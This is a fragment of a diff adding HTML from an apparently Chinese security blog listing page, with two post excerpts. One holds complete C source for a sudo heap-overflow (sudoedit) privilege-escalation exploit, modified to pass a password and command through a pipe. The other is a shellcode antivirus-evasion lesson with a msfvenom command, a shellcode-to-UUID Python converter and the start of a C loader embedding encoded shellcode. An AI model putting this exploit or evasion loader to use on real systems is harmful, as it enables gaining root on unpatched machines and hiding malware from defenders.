+    <span class="s">"-s"</span><span class="p">,</span>
+    <span class="n">buf</span><span class="p">,</span>
+    <span class="nb">NULL</span><span class="p">};</span>
+</code></pre></div></div>
+
+<p>紧接着，需要思考如何传入密码了。</p>
+
+<blockquote>
+  <p>经过测试，即使密码错误的情况下，也能够提权成功。</p>
+</blockquote>
+
+<p>经过查阅资料，关于execve的特点如下：</p>
+
+<p>execve创建的进程将会重新初始化堆栈、堆和（初始化和未初始化的）数据段。</p>
+
+<p>All process attributes are preserved during an execve(), except the following:</p>
+
+<ul>
+  <li>The dispositions of any signals that are being caught are reset to the default (signal(7)).</li>
+  <li>Any alternate signal stack is not preserved (sigaltstack(2)).</li>
+  <li>Memory mappings are not preserved (mmap(2)).</li>
+  <li>Attached System V shared memory segments are detached (shmat(2)).</li>
+  <li>POSIX shared memory regions are unmapped (shm_open(3)).</li>
+  <li>Open POSIX message queue descriptors are closed(mq_overview(7)).</li>
+  <li>Any open POSIX named semaphores are closed (sem_overview(7)).</li>
+  <li>POSIX timers are not preserved (timer_create(2)).</li>
+  <li>Any open directory streams are closed (opendir(3)).</li>
+  <li>Memory locks are not preserved (mlock(2), mlockall(2)).</li>
+  <li>Exit handlers are not preserved (atexit(3), on_exit(3)).</li>
+  <li>The floating-point environment is reset to the default (see fenv(3)).</li>
+  <li>….</li>
+</ul>
+
+<p>这就意味着，在调用execve之前向stdin写入数据，创建后的进程也是读不到的。</p>
+
+<p>于是我写了一个小例子来测验我的解决办法：</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;unistd.h&gt;
+#include &lt;stdlib.h&gt;
+</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">**</span> <span class="n">argv</span><span class="p">)</span>
+<span class="p">{</span>
+        <span class="kt">int</span> <span class="n">des_p</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
+        <span class="k">if</span><span class="p">(</span><span class="n">pipe</span><span class="p">(</span><span class="n">des_p</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+          <span class="n">perror</span><span class="p">(</span><span class="s">"Pipe failed"</span><span class="p">);</span>
+          <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+        <span class="p">}</span>
+
+        <span class="k">if</span><span class="p">(</span><span class="n">fork</span><span class="p">()</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>  <span class="c1">// 创建一个子进程向stdout管道填入数据</span>
+        <span class="p">{</span>
+            <span class="n">close</span><span class="p">(</span><span class="n">STDOUT_FILENO</span><span class="p">);</span>  <span class="c1">// 关闭系统输出流</span>
+            <span class="n">dup</span><span class="p">(</span><span class="n">des_p</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>         <span class="c1">// 将系统输出流替换为管道</span>
+            <span class="n">close</span><span class="p">(</span><span class="n">des_p</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>       <span class="c1">// 关闭输入管道</span>
+            <span class="kt">char</span> <span class="o">*</span> <span class="n">password</span> <span class="o">=</span> <span class="s">"test</span><span class="se">\r\n</span><span class="s">1111"</span><span class="p">;</span> <span class="c1">// 设置管道内容</span>
+            <span class="n">write</span><span class="p">(</span><span class="n">des_p</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span><span class="n">password</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">password</span><span class="p">));</span> <span class="c1">// 将内容写到输出管道中</span>
+            <span class="n">close</span><span class="p">(</span><span class="n">des_p</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span> <span class="c1">// 关闭输出管道</span>
+        <span class="p">}</span>
+
+        <span class="k">if</span><span class="p">(</span><span class="n">fork</span><span class="p">()</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>            <span class="c1">// 创建一个子进程</span>
+        <span class="p">{</span>
+            <span class="n">close</span><span class="p">(</span><span class="n">STDIN_FILENO</span><span class="p">);</span>   <span class="c1">// 关闭系统输入流</span>
+            <span class="n">dup</span><span class="p">(</span><span class="n">des_p</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>         <span class="c1">// 将系统输入流替换为输入管道</span>
+            <span class="n">close</span><span class="p">(</span><span class="n">des_p</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>       <span class="c1">//  关闭输出管道</span>
+            <span class="n">close</span><span class="p">(</span><span class="n">des_p</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>     <span class="c1">// 关闭输入管道</span>
+
+            <span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">prog2</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="s">"wc"</span><span class="p">,</span> <span class="s">"-l"</span><span class="p">,</span> <span class="mi">0</span><span class="p">};</span> <span class="c1">// 执行wc -l </span>
+            <span class="n">execvp</span><span class="p">(</span><span class="n">prog2</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">prog2</span><span class="p">);</span>
+            <span class="n">perror</span><span class="p">(</span><span class="s">"execvp of wc failed"</span><span class="p">);</span>
+            <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+        <span class="p">}</span>
+
+        <span class="n">close</span><span class="p">(</span><span class="n">des_p</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+        <span class="n">close</span><span class="p">(</span><span class="n">des_p</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+        <span class="n">wait</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+        <span class="n">wait</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/5cd0d7de66ef48c3cae7021b88576487.png" alt="2021-02-10-03-10-12" /></p>
+
+<p>测试结果正确：2！</p>
+
+<p>stdin的值为：<code class="language-plaintext highlighter-rouge">test\r\n1111</code>，wc -l 命令读取是以<code class="language-plaintext highlighter-rouge">\n</code>为每一项分割的，因此返回的是2。</p>
+
+<p>这个方案可以直接拿到Exploit中，将stdin覆盖，向管道写入<code class="language-plaintext highlighter-rouge">密码\n命令</code>，然后把命令传入即可。</p>
+
+<p>为什么这里是<code class="language-plaintext highlighter-rouge">密码\n命令</code>呢？</p>
+
+<p>是因为第一个<code class="language-plaintext highlighter-rouge">\n</code>是为了结束密码的传递，然后开始堆溢出，溢出完成后，后续的命令刚好会传入到Shellcode启动的<code class="language-plaintext highlighter-rouge">/bin/sh</code>中。</p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/dd2237b99e5fb3010d0ac87636fba9d4.png" alt="2021-02-10-03-13-24" /></p>
+
+<p>修改后的Exploit：</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;unistd.h&gt; // execve()
+#include &lt;string.h&gt; // strcat()
+#include &lt;stdio.h&gt;
+</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span> <span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
+
+    <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">){</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"Usage: %s &lt;Command&gt; </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"[+]Refrence : @Qualys Research Team @Max Kamper </span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"[+]Modify by Rvn0xsy@ https://payloads.online</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>	
+        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="kt">char</span> <span class="o">*</span> <span class="n">input_command</span> <span class="o">=</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
+    <span class="kt">int</span> <span class="n">nSize</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">input_command</span><span class="p">)</span><span class="o">+</span><span class="mi">6</span><span class="p">;</span>
+    
+    <span class="kt">char</span> <span class="o">*</span> <span class="n">command</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">nSize</span><span class="p">);</span>
+    <span class="n">memset</span><span class="p">(</span><span class="n">command</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="n">nSize</span><span class="p">);</span>
+    <span class="n">sprintf</span><span class="p">(</span><span class="n">command</span><span class="p">,</span><span class="s">"test</span><span class="se">\n\n</span><span class="s">%s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">input_command</span><span class="p">);</span>
+    <span class="c1">// 'buf' size determines size of overflowing chunk.</span>
+    <span class="c1">// This will allocate an 0xf0-sized chunk before the target service_user struct.</span>
+    <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mh">0xf0</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+    <span class="n">memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="sc">'Y'</span><span class="p">,</span> <span class="mh">0xe0</span><span class="p">);</span>
+    <span class="n">strcat</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="s">"</span><span class="se">\\</span><span class="s">"</span><span class="p">);</span>
+
+    <span class="kt">char</span><span class="o">*</span> <span class="n">sudoedit_argv</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="s">"sudoedit"</span><span class="p">,</span>
+	    <span class="s">"-S"</span><span class="p">,</span>
+        <span class="s">"-s"</span><span class="p">,</span>
+        <span class="n">buf</span><span class="p">,</span>
+        <span class="nb">NULL</span><span class="p">};</span>
+
+    <span class="c1">// Use some LC_ vars for heap Feng-Shui.</span>
+    <span class="c1">// This should allocate the target service_user struct in the path of the overflow.</span>
+    <span class="kt">char</span> <span class="n">messages</span><span class="p">[</span><span class="mh">0xe0</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="s">"LC_MESSAGES=en_GB.UTF-8@"</span><span class="p">};</span>
+    <span class="n">memset</span><span class="p">(</span><span class="n">messages</span> <span class="o">+</span> <span class="n">strlen</span><span class="p">(</span><span class="n">messages</span><span class="p">),</span> <span class="sc">'A'</span><span class="p">,</span> <span class="mh">0xb8</span><span class="p">);</span>
+
+    <span class="kt">char</span> <span class="n">telephone</span><span class="p">[</span><span class="mh">0x50</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="s">"LC_TELEPHONE=C.UTF-8@"</span><span class="p">};</span>
+    <span class="n">memset</span><span class="p">(</span><span class="n">telephone</span> <span class="o">+</span> <span class="n">strlen</span><span class="p">(</span><span class="n">telephone</span><span class="p">),</span> <span class="sc">'A'</span><span class="p">,</span> <span class="mh">0x28</span><span class="p">);</span>
+
+    <span class="kt">char</span> <span class="n">measurement</span><span class="p">[</span><span class="mh">0x50</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="s">"LC_MEASUREMENT=C.UTF-8@"</span><span class="p">};</span>
+    <span class="n">memset</span><span class="p">(</span><span class="n">measurement</span> <span class="o">+</span> <span class="n">strlen</span><span class="p">(</span><span class="n">measurement</span><span class="p">),</span> <span class="sc">'A'</span><span class="p">,</span> <span class="mh">0x28</span><span class="p">);</span>
+
+    <span class="c1">// This environment variable will be copied onto the heap after the overflowing chunk.</span>
+    <span class="c1">// Use it to bridge the gap between the overflow and the target service_user struct.</span>
+    <span class="kt">char</span> <span class="n">overflow</span><span class="p">[</span><span class="mh">0x500</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+    <span class="n">memset</span><span class="p">(</span><span class="n">overflow</span><span class="p">,</span> <span class="sc">'X'</span><span class="p">,</span> <span class="mh">0x4cf</span><span class="p">);</span>
+    <span class="n">strcat</span><span class="p">(</span><span class="n">overflow</span><span class="p">,</span> <span class="s">"</span><span class="se">\\</span><span class="s">"</span><span class="p">);</span>
+
+    <span class="c1">// Overwrite the 'files' service_user struct's name with the path of our shellcode library.</span>
+    <span class="c1">// The backslashes write nulls which are needed to dodge a couple of crashes.</span>
+    <span class="kt">char</span><span class="o">*</span> <span class="n">envp</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="n">overflow</span><span class="p">,</span>
+        <span class="s">"</span><span class="se">\\</span><span class="s">"</span><span class="p">,</span> <span class="s">"</span><span class="se">\\</span><span class="s">"</span><span class="p">,</span> <span class="s">"</span><span class="se">\\</span><span class="s">"</span><span class="p">,</span> <span class="s">"</span><span class="se">\\</span><span class="s">"</span><span class="p">,</span> <span class="s">"</span><span class="se">\\</span><span class="s">"</span><span class="p">,</span> <span class="s">"</span><span class="se">\\</span><span class="s">"</span><span class="p">,</span> <span class="s">"</span><span class="se">\\</span><span class="s">"</span><span class="p">,</span> <span class="s">"</span><span class="se">\\</span><span class="s">"</span><span class="p">,</span>
+        <span class="s">"XXXXXXX</span><span class="se">\\</span><span class="s">"</span><span class="p">,</span>
+        <span class="s">"</span><span class="se">\\</span><span class="s">"</span><span class="p">,</span> <span class="s">"</span><span class="se">\\</span><span class="s">"</span><span class="p">,</span> <span class="s">"</span><span class="se">\\</span><span class="s">"</span><span class="p">,</span> <span class="s">"</span><span class="se">\\</span><span class="s">"</span><span class="p">,</span> <span class="s">"</span><span class="se">\\</span><span class="s">"</span><span class="p">,</span> <span class="s">"</span><span class="se">\\</span><span class="s">"</span><span class="p">,</span> <span class="s">"</span><span class="se">\\</span><span class="s">"</span><span class="p">,</span> <span class="s">"</span><span class="se">\\</span><span class="s">"</span><span class="p">,</span>
+        <span class="s">"</span><span class="se">\\</span><span class="s">"</span><span class="p">,</span> <span class="s">"</span><span class="se">\\</span><span class="s">"</span><span class="p">,</span> <span class="s">"</span><span class="se">\\</span><span class="s">"</span><span class="p">,</span> <span class="s">"</span><span class="se">\\</span><span class="s">"</span><span class="p">,</span> <span class="s">"</span><span class="se">\\</span><span class="s">"</span><span class="p">,</span> <span class="s">"</span><span class="se">\\</span><span class="s">"</span><span class="p">,</span> <span class="s">"</span><span class="se">\\</span><span class="s">"</span><span class="p">,</span>
+        <span class="s">"x/x</span><span class="se">\\</span><span class="s">"</span><span class="p">,</span>
+        <span class="s">"Z"</span><span class="p">,</span>
+        <span class="n">messages</span><span class="p">,</span>
+        <span class="n">telephone</span><span class="p">,</span>
+        <span class="n">measurement</span><span class="p">,</span>
+        <span class="nb">NULL</span><span class="p">};</span>
+
+	<span class="kt">int</span> <span class="n">des_p</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
+	<span class="k">if</span><span class="p">(</span><span class="n">pipe</span><span class="p">(</span><span class="n">des_p</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">){</span>
+
+		<span class="n">puts</span><span class="p">(</span><span class="s">"Error .. pipe </span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+		<span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+	<span class="p">}</span>
+	
+	<span class="k">if</span><span class="p">(</span><span class="n">fork</span><span class="p">()</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>   
+        <span class="p">{</span>
+            <span class="n">close</span><span class="p">(</span><span class="n">STDOUT_FILENO</span><span class="p">);</span>
+            <span class="n">dup</span><span class="p">(</span><span class="n">des_p</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>  
+            <span class="n">close</span><span class="p">(</span><span class="n">des_p</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span> 
+	    <span class="n">write</span><span class="p">(</span><span class="n">des_p</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span><span class="n">command</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">command</span><span class="p">));</span>
+            <span class="n">close</span><span class="p">(</span><span class="n">des_p</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+	    <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+        <span class="p">}</span>
+
+	<span class="k">if</span><span class="p">(</span><span class="n">fork</span><span class="p">()</span><span class="o">==</span><span class="mi">0</span><span class="p">){</span>
+		<span class="n">close</span><span class="p">(</span><span class="n">STDIN_FILENO</span><span class="p">);</span> 
+		<span class="n">dup</span><span class="p">(</span><span class="n">des_p</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>  
+		<span class="n">close</span><span class="p">(</span><span class="n">des_p</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span> 
+		<span class="n">close</span><span class="p">(</span><span class="n">des_p</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+		
+		<span class="n">execve</span><span class="p">(</span><span class="s">"/usr/bin/sudoedit"</span><span class="p">,</span> <span class="n">sudoedit_argv</span><span class="p">,</span> <span class="n">envp</span><span class="p">);</span>
+		<span class="n">perror</span><span class="p">(</span><span class="s">"execvp of stdread failed"</span><span class="p">);</span>
+		<span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+	<span class="p">}</span>
+	<span class="n">close</span><span class="p">(</span><span class="n">des_p</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+	<span class="n">close</span><span class="p">(</span><span class="n">des_p</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+	<span class="n">wait</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+	<span class="n">wait</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<h2 id="0x03-演示效果">0x03 演示效果</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Usage: ./exploit &lt;Command&gt; 
+[+]Refrence : @Qualys Research Team @Max Kamper 
+[+]Modify by Rvn0xsy@ https://payloads.online
+</code></pre></div></div>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/3090faa10656870d97de81bfad60c107.png" alt="2021-02-10-03-18-26" /></p>
+
+-->
+          <!---->
+          Qualys研究团队在sudo中发现了一个堆溢出漏洞，该漏洞在类似Unix的主要操作系统上都可以使用。通过利用此漏洞，任何没有特权的用户都可以使用默认的sudo配置在易受攻击的主机上获得root特权。
+          <p>
+            <a class="post-link" href="/archivers/2021-02-09/1">Read More »</a>
+          </p>
+        </div>
+      </li>
+    
+      <li>
+        <h2>
+          <a class="post-link" href="/archivers/2021-02-08/1">静态恶意代码逃逸（第十课）</a>
+        </h2>
+        
+        <div class="post-meta">Feb 8, 2021</div>
+
+        <div class="post-excerpt">
+          <!--<p>代码将会上传至Github，方便读者下载研究 : https://github.com/Rvn0xsy/BadCode</p>
+
+<h2 id="0x01-uuid">0x01 UUID</h2>
+
+<p>通用唯一标识符（universally unique identifier, UUID）是一个128位的用于在计算机系统中以识别信息的数目。在Windows中也有使用GUID来标识唯一对象。 — 来源：<a href="https://en.wikipedia.org/wiki/Universally_unique_identifier">维基百科</a></p>
+
+<p>关于Windows中的GUID也等同于UUID，先看一下结构：</p>
+
+<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">typedef</span> <span class="k">struct</span> <span class="nc">_GUID</span> <span class="p">{</span>
+  <span class="kt">unsigned</span> <span class="kt">long</span>  <span class="n">Data1</span><span class="p">;</span> <span class="c1">// 4字节</span>
+  <span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">Data2</span><span class="p">;</span> <span class="c1">// 2字节</span>
+  <span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">Data3</span><span class="p">;</span> <span class="c1">// 2字节</span>
+  <span class="kt">unsigned</span> <span class="kt">char</span>  <span class="n">Data4</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span> <span class="c1">// 8字节</span>
+<span class="p">}</span> <span class="n">GUID</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>总和一共16字节，16*8 = 128位。</p>
+
+<h2 id="0x02-与uuid相关的windows-api">0x02 与UUID相关的Windows API</h2>
+
+<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">RPC_STATUS</span> <span class="nf">UuidFromString</span><span class="p">(</span>
+  <span class="n">RPC_CSTR</span> <span class="n">StringUuid</span><span class="p">,</span>
+  <span class="n">UUID</span>     <span class="o">*</span><span class="n">Uuid</span>
+<span class="p">);</span>
+</code></pre></div></div>
+
+<p>功能：将字符串UUID转换为UUID结构。</p>
+
+<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">RPC_STATUS</span> <span class="nf">UuidCreate</span><span class="p">(</span>
+  <span class="n">UUID</span> <span class="o">*</span><span class="n">Uuid</span>
+<span class="p">);</span>
+</code></pre></div></div>
+
+<p>功能：创建UUID结构。</p>
+
+<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">UuidEqual</span><span class="p">(</span>
+  <span class="n">UUID</span>       <span class="o">*</span><span class="n">Uuid1</span><span class="p">,</span>
+  <span class="n">UUID</span>       <span class="o">*</span><span class="n">Uuid2</span><span class="p">,</span>
+  <span class="n">RPC_STATUS</span> <span class="o">*</span><span class="n">Status</span>
+<span class="p">);</span>
+</code></pre></div></div>
+
+<p>功能：判断两个UUID是否相等。</p>
+
+<p>通过URL查看：https://docs.microsoft.com/en-us/windows/win32/rpc/rpcdce/ns-rpcdce-uuid</p>
+
+<p>UUID 代表了 -&gt; <code class="language-plaintext highlighter-rouge">typedef GUID UUID;</code></p>
+
+<h2 id="0x03-uuid-测试">0x03 UUID 测试</h2>
+
+<h3 id="生成shellcode">生成Shellcode</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./msfvenom -p windows/exec CMD=calc.exe -b '\xfc\xe8' -f raw -o /tmp/shellcode.bin
+</code></pre></div></div>
+
+<h3 id="bin2uuid">Bin2UUID</h3>
+
+<p>生成脚本：</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">uuid</span> <span class="kn">import</span> <span class="n">UUID</span>
+<span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+
+<span class="c1"># Usage: python3 binToUUIDs.py shellcode.bin [--print]
+</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"""
+  ____  _    _______    _    _ _    _ _____ _____       
+ |  _ \(_)  |__   __|  | |  | | |  | |_   _|  __ \      
+ | |_) |_ _ __ | | ___ | |  | | |  | | | | | |  | |___  
+ |  _ &lt;| | '_ \| |/ _ \| |  | | |  | | | | | |  | / __| 
+ | |_) | | | | | | (_) | |__| | |__| |_| |_| |__| \__ \ 
+ |____/|_|_| |_|_|\___/ \____/ \____/|_____|_____/|___/
+</span><span class="se">\n</span><span class="s">"""</span><span class="p">)</span>
+
+<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="s">"rb"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+    <span class="nb">bin</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="n">read</span><span class="p">()</span>
+
+<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">2</span> <span class="ow">and</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">==</span> <span class="s">"--print"</span><span class="p">:</span>
+    <span class="n">outputMapping</span> <span class="o">=</span> <span class="bp">True</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">outputMapping</span> <span class="o">=</span> <span class="bp">False</span>
+
+<span class="n">offset</span> <span class="o">=</span> <span class="mi">0</span>
+
+<span class="k">print</span><span class="p">(</span><span class="s">"Length of shellcode: {} bytes</span><span class="se">\n</span><span class="s">"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="nb">bin</span><span class="p">)))</span>
+
+<span class="n">out</span> <span class="o">=</span> <span class="s">""</span>
+
+<span class="k">while</span><span class="p">(</span><span class="n">offset</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="nb">bin</span><span class="p">)):</span>
+    <span class="n">countOfBytesToConvert</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="nb">bin</span><span class="p">[</span><span class="n">offset</span><span class="p">:])</span>
+    <span class="k">if</span> <span class="n">countOfBytesToConvert</span> <span class="o">&lt;</span> <span class="mi">16</span><span class="p">:</span>
+        <span class="n">ZerosToAdd</span> <span class="o">=</span> <span class="mi">16</span> <span class="o">-</span> <span class="n">countOfBytesToConvert</span>
+        <span class="n">byteString</span> <span class="o">=</span> <span class="nb">bin</span><span class="p">[</span><span class="n">offset</span><span class="p">:]</span> <span class="o">+</span> <span class="p">(</span><span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="o">*</span> <span class="n">ZerosToAdd</span><span class="p">)</span>
+        <span class="n">uuid</span> <span class="o">=</span> <span class="n">UUID</span><span class="p">(</span><span class="n">bytes_le</span><span class="o">=</span><span class="n">byteString</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">byteString</span> <span class="o">=</span> <span class="nb">bin</span><span class="p">[</span><span class="n">offset</span><span class="p">:</span><span class="n">offset</span><span class="o">+</span><span class="mi">16</span><span class="p">]</span>
+        <span class="n">uuid</span> <span class="o">=</span> <span class="n">UUID</span><span class="p">(</span><span class="n">bytes_le</span><span class="o">=</span><span class="n">byteString</span><span class="p">)</span>
+    <span class="n">offset</span><span class="o">+=</span><span class="mi">16</span>
+
+    <span class="n">out</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\"</span><span class="s">{}</span><span class="se">\"</span><span class="s">,</span><span class="se">\n</span><span class="s">"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">uuid</span><span class="p">)</span>
+    
+    <span class="k">if</span> <span class="n">outputMapping</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">"{} -&gt; {}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">byteString</span><span class="p">,</span> <span class="n">uuid</span><span class="p">))</span>
+
+<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="s">"UUIDs"</span><span class="p">,</span> <span class="s">"w"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+    <span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">out</span><span class="p">)</span>
+
+<span class="k">print</span><span class="p">(</span><span class="s">"Outputted to: {}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="s">"UUIDs"</span><span class="p">))</span>
+</code></pre></div></div>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/3922558744d8fb3071d39e5f8343c6ff.png" alt="2021-02-08-20-41-08" /></p>
+
+<h3 id="生成测试样本">生成测试样本</h3>
+
+<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;Windows.h&gt;
+#include &lt;rpc.h&gt;
+#pragma comment(lib,"Rpcrt4.lib")
+</span>
+<span class="k">const</span> <span class="kt">char</span> <span class="o">*</span> <span class="n">buf</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
+	<span class="s">"4baf01bd-dbdd-d9de-7424-f45a33c9b131"</span><span class="p">,</span>
+	<span class="s">"83136a31-04c2-6a03-0e4d-be21f81341da"</span><span class="p">,</span>
+	<span class="s">"3fcb73f8-b3c9-34af-7904-bb1975efe989"</span><span class="p">,</span>
+	<span class="s">"bd259d0e-28a7-f010-3800-6093ba5bb573"</span><span class="p">,</span>
+	<span class="s">"72c89383-cec4-2621-9d85-94d7aad02453"</span><span class="p">,</span>
+	<span class="s">"802cf5e0-f4b0-171d-cbae-bd9918dbf781"</span><span class="p">,</span>
+	<span class="s">"394ee67d-9cb5-eb50-845d-fed229acfe13"</span><span class="p">,</span>
+	<span class="s">"6a754f8d-f2ee-a98e-8d28-1a2a35babc96"</span><span class="p">,</span>
+	<span class="s">"5c5a6fc4-c4ca-3a28-cedb-fd30ea500097"</span><span class="p">,</span>
+	<span class="s">"3327227b-f020-6246-8c57-76746f07d2fe"</span><span class="p">,</span>
+	<span class="s">"5d6f5c9d-a3cb-dbfd-b9a4-fde3edcccc68"</span><span class="p">,</span>
+	<span class="s">"bad08a62-64c7-e79b-61ed-4272307075a8"</span><span class="p">,</span>
+	<span class="s">"59f68d76-6a06-2be6-0336-a0c0792745e7"</span><span class="p">,</span>
+	<span class="s">"844c482e-dab1-650c-545b-b67900000000"</span>
+<span class="p">};</span>
+
+
